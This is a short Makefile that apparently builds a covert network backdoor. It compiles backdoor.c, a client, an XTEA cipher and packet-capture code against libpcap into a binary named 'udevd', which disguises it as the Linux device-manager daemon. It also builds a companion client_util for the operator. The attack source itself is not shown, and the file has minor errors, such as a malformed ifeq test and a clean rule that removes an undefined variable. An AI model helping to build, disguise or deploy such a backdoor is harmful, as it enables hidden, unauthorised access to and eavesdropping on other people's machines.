bin = udevd
compiler = gcc
flags = -W -Wall -pedantic
dflags = -g -DDEBUG
lib = -lpcap
cmp = $(compiler) $(flags) -c
lnk = $(compiler) $(flags) $(lib) -o $(bin)
obj = backdoor.o pkthdr.o xtea.o util.o client.o network.o

ifeq (($os), Darwin)
	flags += -j8
endif

all : $(bin)

debug : flags += $(dflags)
debug : $(bin)

$(bin) : $(obj)
	$(lnk) $(obj)

client_util : bin = client_util
client_util : client_util.o util.o xtea.o
	$(lnk) client_util.o util.o xtea.o

backdoor.o : backdoor.c pkthdr.h xtea.h util.h
	$(cmp) backdoor.c

pkthdr.o : pkthdr.c pkthdr.h
	$(cmp) pkthdr.c

xtea.o : xtea.c xtea.h
	$(cmp) xtea.c

util.o : util.c util.h
	$(cmp) util.c

client.o : client.c clntsrvr.h network.h pkthdr.h
	$(cmp) client.c

network.o : network.c
	$(cmp) network.c

client_util.o : client_util.c util.h xtea.h
	$(cmp) client_util.c

clean :
	rm $(main) *.o
